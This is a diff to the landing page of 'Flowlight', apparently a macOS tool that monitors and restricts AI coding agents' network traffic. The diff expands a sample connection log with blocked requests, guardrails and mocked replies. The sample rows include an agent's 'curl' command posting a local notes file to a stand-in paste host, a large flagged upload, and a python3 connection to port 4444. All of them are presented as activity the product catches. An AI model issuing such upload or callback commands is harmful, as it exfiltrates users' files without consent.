@@ -27,21 +27,25 @@ nav: home
         </div>
       </div>
 
-      <div class="log" role="img" aria-label="Example of Flowlight's live connection log, with a Codex upload and a Claude Code email flagged">
+      <div class="log" role="img" aria-label="Example of Flowlight's live connection log: traffic per app and domain, a connection refused by a rule, an agent guardrail removing tools, an AirDrop over peer-to-peer Wi-Fi, and a mocked response">
         <div class="log-head"><span class="dot"></span><span class="dot"></span><span class="dot"></span>
           <span style="margin-left:8px">connections</span><span class="live"><span class="pulse"></span>live</span></div>
         <ol id="log">
           <li><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · https:443</span><span class="bytes up">↑ 1.4 MB</span></li>
+          <li class="tool"><span class="app"></span><span class="note">↳ Bash: curl -s https://paste.example/up -d @notes.txt</span></li>
+          <li class="block"><span class="app">claude › curl</span><span class="dest"><b>paste.example</b> · https:443</span><span class="bytes up">refused</span>
+            <span class="note">⛔ rule “Claude Code can't reach paste.example”</span></li>
           <li><span class="app">Chrome</span><span class="dest"><b>www.youtube.com</b> · quic:443</span><span class="bytes down">↓ 9.2 MB</span></li>
           <li class="flag"><span class="app">codex</span><span class="dest"><b>uploads.paste.example</b> · https:443</span><span class="bytes up">↑ 180 MB</span>
             <span class="note">⚠ possible exfiltration: 180 MB to a non-AI host in 1 h</span></li>
+          <li class="p2p"><span class="app">sharingd</span><span class="dest"><b>AirDrop · nearby device</b> · awdl0</span><span class="bytes up">↑ 4.1 GB</span></li>
+          <li class="guard"><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · tools/list</span><span class="bytes down">−3 tools</span>
+            <span class="note">🛡 guardrail: Bash, Write, Edit removed before the model saw them</span></li>
           <li><span class="app">Slack</span><span class="dest"><b>wss-primary.slack.com</b> · websocket</span><span class="bytes down">↓ 120 KB</span></li>
-          <li><span class="app">Mail</span><span class="dest"><b>imap.mail.me.com</b> · imaps:993</span><span class="bytes down">↓ 210 KB</span></li>
           <li class="flag"><span class="app">claude</span><span class="dest"><b>smtp.relay.example</b> · smtp:587</span><span class="bytes up">↑ 2.4 MB</span>
             <span class="note">⚠ agent used email (SMTP submission)</span></li>
-          <li><span class="app">Cursor</span><span class="dest"><b>api2.cursor.sh</b> · https:443</span><span class="bytes up">↑ 800 KB</span></li>
-          <li><span class="app">timed</span><span class="dest"><b>time.apple.com</b> · ntp:123</span><span class="bytes down">↓ 90 B</span></li>
-          <li><span class="app">mDNSResp…</span><span class="dest"><b>dns.google</b> · dns-over-https</span><span class="bytes down">↓ 6 KB</span></li>
+          <li class="mock"><span class="app">Cursor</span><span class="dest"><b>api2.cursor.sh</b> · POST /v1/chat</span><span class="bytes down">503</span>
+            <span class="note">✎ answered by Flowlight, never sent — mock “rate limited”</span></li>
         </ol>
       </div>
     </div>
@@ -470,32 +474,56 @@ open Flowlight.app --args -FLDemo YES</pre>
 </main>
 <script>
   // Stream new lines into the connection log. The full log is readable at rest.
+  //
+  // The feed is a tour of what Flowlight does now: traffic and alerts, but also a refusal, a guardrail taking a
+  // tool away before the model is offered it, a mocked answer, peer-to-peer Wi-Fi, a device arriving, and a tool
+  // call tied to the request it caused.
   (function () {
     var log = document.getElementById("log");
     if (!log || window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
     var feed = [
-      ["Chrome", "github.com", "https:443", "down", "↓ 640 KB"],
-      ["codex", "api.openai.com", "https:443", "up", "↑ 900 KB"],
-      ["Music", "aod.itunes.apple.com", "https:443", "down", "↓ 1.6 MB"],
-      ["claude", "registry.npmjs.org", "https:443", "down", "↓ 300 KB"],
-      ["zoom.us", "zoom.us", "zoom-media:8801", "down", "↓ 6.1 MB"],
-      ["python3", "203.0.113.45", "tcp:4444", "up", "↑ 40 KB", "⚠ agent contacted an unnamed host"],
-      ["Safari", "en.wikipedia.org", "https:443", "down", "↓ 250 KB"],
-      ["claude", "github.com", "ssh:22", "up", "↑ 30 KB", "⚠ agent opened an SSH session"],
-      ["iCloud", "p45-content.icloud.com", "https:443", "up", "↑ 700 KB"],
-      ["Slack", "files.slack.com", "https:443", "down", "↓ 400 KB"],
+      { app: "Chrome", dest: "github.com", proto: "https:443", dir: "down", bytes: "\u2193 640 KB" },
+      { app: "codex", dest: "api.openai.com", proto: "https:443", dir: "up", bytes: "\u2191 900 KB" },
+      { kind: "tool", note: "\u21b3 Read: ~/.ssh/config \u2192 no network call" },
+      { app: "claude", dest: "registry.npmjs.org", proto: "https:443", dir: "down", bytes: "\u2193 300 KB" },
+      { app: "claude \u203a node", dest: "registry.npmjs.org", proto: "https:443", dir: "up", bytes: "refused",
+        kind: "block", note: "\u26d4 rule \u201cno package installs after 18:00\u201d" },
+      { app: "zoom.us", dest: "zoom.us", proto: "zoom-media:8801", dir: "down", bytes: "\u2193 6.1 MB" },
+      { kind: "device", note: "\u25cf Backup Drive connected \u00b7 USB \u00b7 2 TB" },
+      { app: "python3", dest: "203.0.113.45", proto: "tcp:4444", dir: "up", bytes: "\u2191 40 KB",
+        kind: "flag", note: "\u26a0 agent contacted an unnamed host" },
+      { app: "rapportd", dest: "Continuity \u00b7 nearby device", proto: "llw0", dir: "down", bytes: "\u2193 310 KB", kind: "p2p" },
+      { app: "claude", dest: "mcp.github.com", proto: "tools/call", dir: "down", bytes: "isError",
+        kind: "guard", note: "\u1f6e guardrail: create_issue refused, and the model was told why" },
+      { app: "Safari", dest: "en.wikipedia.org", proto: "https:443", dir: "down", bytes: "\u2193 250 KB" },
+      { app: "claude", dest: "github.com", proto: "ssh:22", dir: "up", bytes: "\u2191 30 KB",
+        kind: "flag", note: "\u26a0 agent opened an SSH session" },
+      { app: "Flowlight", dest: "127.0.0.1", proto: "ollama:11434", dir: "up", bytes: "\u2191 2 KB",
+        kind: "ask", note: "\u2261 Ask: answered on this Mac \u00b7 4 queries, nothing sent" },
+      { app: "sharingd", dest: "AirDrop \u00b7 nearby device", proto: "awdl0", dir: "up", bytes: "\u2191 820 MB", kind: "p2p" },
+      { app: "iCloud", dest: "p45-content.icloud.com", proto: "https:443", dir: "up", bytes: "\u2191 700 KB" },
+      { app: "Cursor", dest: "api2.cursor.sh", proto: "POST /v1/chat", dir: "down", bytes: "503",
+        kind: "mock", note: "\u270e answered by Flowlight, never sent \u2014 mock \u201crate limited\u201d" },
     ];
     var i = 0;
     function line(r) {
       var li = document.createElement("li");
-      li.className = "enter" + (r[5] ? " flag" : "");
-      li.innerHTML = '<span class="app"></span><span class="dest"><b></b> · <i></i></span><span class="bytes ' + r[3] + '"></span>' +
-        (r[5] ? '<span class="note"></span>' : "");
-      li.querySelector(".app").textContent = r[0];
-      li.querySelector(".dest b").textContent = r[1];
-      var proto = li.querySelector(".dest i"); proto.textContent = r[2]; proto.style.fontStyle = "normal";
-      li.querySelector(".bytes").textContent = r[4];
-      if (r[5]) li.querySelector(".note").textContent = r[5];
+      li.className = ["enter", r.kind || ""].join(" ").trim();
+      // A row with no destination is an event rather than a connection: a tool call, a device arriving.
+      if (!r.dest) {
+        li.innerHTML = '<span class="app"></span><span class="note"></span>';
+        li.querySelector(".note").textContent = r.note;
+        return li;
+      }
+      li.innerHTML = '<span class="app"></span><span class="dest"><b></b> \u00b7 <i></i></span>' +
+        '<span class="bytes ' + (r.dir || "") + '"></span>' + (r.note ? '<span class="note"></span>' : "");
+      li.querySelector(".app").textContent = r.app;
+      li.querySelector(".dest b").textContent = r.dest;
+      var proto = li.querySelector(".dest i");
+      proto.textContent = r.proto;
+      proto.style.fontStyle = "normal";
+      li.querySelector(".bytes").textContent = r.bytes;
+      if (r.note) li.querySelector(".note").textContent = r.note;
       return li;
     }
     setInterval(function () {
